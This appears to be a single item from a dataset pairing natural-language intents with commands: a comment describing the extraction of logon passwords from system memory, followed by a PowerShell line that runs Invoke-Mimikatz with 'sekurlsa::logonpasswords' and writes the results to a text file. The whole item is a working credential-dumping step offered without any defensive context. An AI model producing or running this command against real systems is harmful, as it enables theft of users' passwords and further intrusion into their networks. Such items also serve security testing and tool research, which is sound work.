# Natural language intent:
# Extracting System Secrets with Mimikatz, Uses Mimikatz to extract logon passwords and other sensitive data from system memory.

Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt
